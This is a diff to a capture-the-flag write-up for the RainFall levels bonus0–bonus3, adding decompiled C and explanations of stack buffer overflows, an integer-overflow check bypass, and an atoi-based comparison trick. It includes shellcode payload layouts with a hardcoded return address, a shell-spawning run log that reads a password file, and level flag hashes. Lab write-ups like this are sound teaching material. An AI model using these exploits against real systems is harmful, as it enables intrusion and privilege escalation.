@@ -720,72 +720,95 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 ## bonus0
 
-```console
-(gdb) disas pp
-Dump of assembler code for function pp:
-   0x0804851e <+0>:     push   ebp
-   0x0804851f <+1>:     mov    ebp,esp
-   0x08048521 <+3>:     push   edi
-   0x08048522 <+4>:     push   ebx
-   0x08048523 <+5>:     sub    esp,0x50
-   0x08048526 <+8>:     mov    DWORD PTR [esp+0x4],0x80486a0
-   0x0804852e <+16>:    lea    eax,[ebp-0x30]
-   0x08048531 <+19>:    mov    DWORD PTR [esp],eax
-   0x08048534 <+22>:    call   0x80484b4 <p>
-   0x08048539 <+27>:    mov    DWORD PTR [esp+0x4],0x80486a0
-   0x08048541 <+35>:    lea    eax,[ebp-0x1c]
-   0x08048544 <+38>:    mov    DWORD PTR [esp],eax
-   0x08048547 <+41>:    call   0x80484b4 <p>
-   0x0804854c <+46>:    lea    eax,[ebp-0x30]
-   0x0804854f <+49>:    mov    DWORD PTR [esp+0x4],eax
-   0x08048553 <+53>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x08048556 <+56>:    mov    DWORD PTR [esp],eax
-   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt>
-   0x0804855e <+64>:    mov    ebx,0x80486a4
-   0x08048563 <+69>:    mov    eax,DWORD PTR [ebp+0x8]
-   0x08048566 <+72>:    mov    DWORD PTR [ebp-0x3c],0xffffffff
-   0x0804856d <+79>:    mov    edx,eax
-   0x0804856f <+81>:    mov    eax,0x0
-   0x08048574 <+86>:    mov    ecx,DWORD PTR [ebp-0x3c]
-   0x08048577 <+89>:    mov    edi,edx
-   0x08048579 <+91>:    repnz scas al,BYTE PTR es:[edi]
-   0x0804857b <+93>:    mov    eax,ecx
-   0x0804857d <+95>:    not    eax
-   0x0804857f <+97>:    sub    eax,0x1
-   0x08048582 <+100>:   add    eax,DWORD PTR [ebp+0x8]
-   0x08048585 <+103>:   movzx  edx,WORD PTR [ebx]
-   0x08048588 <+106>:   mov    WORD PTR [eax],dx
-   0x0804858b <+109>:   lea    eax,[ebp-0x1c]
-   0x0804858e <+112>:   mov    DWORD PTR [esp+0x4],eax
-   0x08048592 <+116>:   mov    eax,DWORD PTR [ebp+0x8]
-   0x08048595 <+119>:   mov    DWORD PTR [esp],eax
-   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
-   0x0804859d <+127>:   add    esp,0x50
-   0x080485a0 <+130>:   pop    ebx
-   0x080485a1 <+131>:   pop    edi
-   0x080485a2 <+132>:   pop    ebp
-   0x080485a3 <+133>:   ret    
-End of assembler dump.
+We want to get a stack buffer overflow to overwrite the return address of `main` and jump to a shellcode.
+
+```c
+int main() {
+    char buf[42];
+
+    pp(buf);
+    puts(buf);
+    return 0;
+}
 ```
 
-We can do 20 then 19.
+We thus wants to puts more than 42 characters in the buffer, let's look at the `pp` function:
 
-```console
-bonus0@RainFall:~$ ./bonus0 
- - 
-abcdefghijklmnopqrst
- - 
-abcdefghijklmnopqrs 
-abcdefghijklmnopqrstabcdefghijklmnopqrs abcdefghijklmnopqrs
-Segmentation fault (core dumped)
+```c
+void pp(char* dest) {
+    char s1[20];
+    char s2[20];
+
+    p(s1, " - ");
+    p(s2, " - ");
+    strcpy(dest, s1);
+
+    size_t len = strlen(dest);
+    dest[len] = ' ';
+    dest[len + 1] = '\0';
+    strcat(dest, s2);
+}
 ```
 
-TODO clean
+We see that a function called `p` is used to set the buffers `s1` and `s2`.
+Let's look at it.
 
+```c
+void p(char* dest, char* s) {
+    char buf[4096];
+
+    puts(s);
+    read(STDIN_FILENO, buf, 4096);
+    *strchr(buf, '\n') = '\0';
+    strncpy(dest, buf, 20);
+}
+```
+
+We see that we can put 20 arbitrary bytes into `buf`.
+Meaning we can have a non-null terminated `s1` or `s2`, by setting them to 20 non-null bytes.
+
+By having a non-null terminated `s1`:
+- The call to `strcpy` will copy `s1` to `dest`, then `s2` to `dest` (`s1` and `s2` are continous on the stack)
+- Then, `dest` will be concatenated with `s2`
+
+`dest` will therefore looks like this at the end of `pp`:
+```
+[s1 (20 bytes)][s2 (at most 19 bytes)][s2 (at most 19 bytes)]
+```
+
+By putting a 23 bytes shellcode in (`s1` + `s2`), and the address of the `dest` buffer somewhere in `s2`, we can overwrite the return address of `main` to jump to our shellcode.
+
+With the shell given by our shellcode, we then retrieve the flag.
+
+```console
+bonus0@RainFall:~$ bash /tmp/bonus0.sh
+ - 
+ - 
+1�P
+   h//shh/bin��1�1�̀AAAAAAAAAAA&���A �̀AAAAAAAAAAA&���A
+whoami
+bonus1
+cat /home/user/bonus1/.pass
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
-
+```
 
 ## bonus1
+
+This challenge hinges on signed integer conversion: `atoi` allows negative values, so the `n > 9` check can be bypassed while still giving `memcpy` a size big enough to overflow the buffer into `n` itself.
+
+We'd like to set `n = 44 / 4 = 11`, but the check forbids it. The trick then is to set n = `11 - 2**30`. When it is multiplied by 4, `2**30` becomes `2**32` which overflows, and we are left with 44 bytes copied.
+
+```c
+int main(int argc, const char** argv, const char** envp) {
+    char dest[40];
+    int n = atoi(argv[1]);
+    if (n > 9) return EXIT_FAILURE;
+    memcpy(dest, argv[2], 4 * n);
+    printf("%d\n", n);
+    if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);
+    return EXIT_SUCCESS;
+}
+```
 
 ```console
 bonus1@RainFall:~$ bc <<< 11-2^30 
@@ -800,10 +823,98 @@ $ cat /home/user/bonus2/.pass
 
 ## bonus2
 
-71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+We want to use a stack buffer overflow to overwrite the return address of `greetuser` to jump to a shellcode.
+
+We will set the environment variable `LANG=nl` to be in the case `lang == 2` in the `greetuser` function.
+
+In the `greetuser` function, the buffer `msg` is concatenated with `user.firstname`:
+```c
+void greetuser(t_user user) {
+    char msg[64];
+
+    switch (lang) {
+    case 1: strcpy(msg, "Hyvää päivää "); break;
+    case 2: strcpy(msg, "Goedemiddag! "); break;
+    case 0: strcpy(msg, "Hello "); break;
+    }
+    strcat(msg, user.firstname);
+    puts(msg);
+}
+```
+
+`t_user` is a struct containing two buffers:
+```c
+typedef struct s_user {
+    char firstname[40];
+    char surname[32];
+} t_user;
+```
+
+`user.firstname` and `user.surname` are set in `main`:
+```c
+int main(int argc, char* argv[]) {
+    char* env_lang;
+    t_user user;
+
+    if (argc != 3) return 1;
+    memset(&user, 0, sizeof(t_user));
+    strncpy(user.firstname, argv[1], 40);
+    strncpy(user.surname, argv[2], 32);
+    env_lang = getenv("LANG");
+    if (env_lang) {
+        if (memcmp(env_lang, "fi", 2) == 0)
+            lang = 1;
+        else if (memcmp(env_lang, "nl", 2) == 0)
+            lang = 2;
+    }
+    greetuser(user);
+}
+```
+
+We can see that we can fill `user.firstname` with arbitrary characters.
+By filling it with 40 non-null characters, the content of `msg` after `strcat(msg, user.firstname);` in the `greetuser` function is as follows:
+```
+"Goedemiddag! " + user.firstname + user.surname
+```
+
+We can therefore write (13 + 40 + 32) = 85 bytes to `msg`.
+It is enough to overwrite the return address of `greetuser`, located at the address (msg + 76).
+
+We can thus write our shellcode at the beginning of `argv[1]` and overwrite the return address of `greetuser` with `argv[1]` to jump to our shellcode.
+
+Our payload:
+```bash
+ARGV1 := shellcode (23 bytes) + filler (17 non-zero bytes)
+ARGV2 := filler ((76 - 40 - 13) = 23 bytes) + 0xbffff670 (address of argv[1], 4 bytes)
+./bonus2 "${ARGV1}" "${ARGV2}"
+```
+
+This gives us a shell, which we can use to retrieve the flag.
 
 
 ## bonus3
+
+```c
+int main(int argc, const char** argv) {
+    char buf[132];
+    FILE* file = fopen("/home/user/end/.pass", "r");
+    memset(buf, 0, sizeof(buf));
+    if (!file || argc != 2) return -1;
+
+    fread(buf, 1, 66, file);
+    buf[65] = 0;
+    buf[atoi(argv[1])] = 0;
+    fread(&buf[66], 1, 65, file);
+    fclose(file);
+    if (!strcmp(buf, argv[1]))
+        execl("/bin/sh", "sh", 0);
+    else
+        puts(&buf[66]);
+    return 0;
+}
+```
+
+Because `atoi("")` returns 0, the program sets `buf[0] = 0`, effectively forcing the first half of the buffer to become an empty string. Since `strcmp(buf, argv[1])` then compares `""` to `""`, the check succeeds, dropping us straight into the shell.
 
 ```console
 bonus3@RainFall:~$ ./bonus3 ''
